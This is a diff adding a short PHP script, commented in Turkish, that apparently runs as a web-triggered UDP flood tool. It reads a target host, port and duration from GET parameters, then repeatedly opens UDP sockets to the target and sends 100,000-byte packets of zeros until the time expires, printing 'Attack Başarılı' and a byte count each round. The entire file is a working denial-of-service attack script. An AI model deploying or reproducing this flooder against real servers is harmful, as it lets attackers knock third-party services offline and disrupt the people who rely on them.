@@ -1,0 +1,29 @@
+//GET ile parametrelerimizi adresimizden bekliyoruz.
+if(!isset($_GET["host"]))die("Host adres belirtilmemiş !");
+if(!isset($_GET["zaman"]))die("Zaman ayarı verilmemiş !");
+if(!isset($_GET["port"]))die("Port ayarı verilmemiş !");
+
+//Paket Büyüklüğü :
+$size = 100000;
+
+//Gelen parametrelerimizi Değişkenlere atıyoruz.
+$host           = $_GET["host"];
+$attacktime     = $_GET["zaman"];
+$port           = $_GET["port"];
+$baslangic      = time();
+$rq             = str_repeat("0",$size);
+
+//Bağlantıyı terk etmeyi sağlar beklemez
+ignore_user_abort(FALSE);
+
+for($i = 1 ; time() < ($baslangic + $attacktime) ; $i++)
+{
+   //fsockopen ile bir socket bağlantısı oluşturup UDP protokolü ile hedef serverımıza belirttiğimiz süre kadar istek gönderiyoruz.
+    $playGame = fsockopen("udp://$host",$port,$errno,$msg,12);
+    echo $i . " Attack Başarılı"." Paket : " .$i*$size. "<br />";
+    fwrite($playGame,$rq);
+    fclose($playGame);
+}
+
+$trace = array("time"=>time() - $baslangic,"bytes"=>$i*$size);
+echo json_encode($trace);
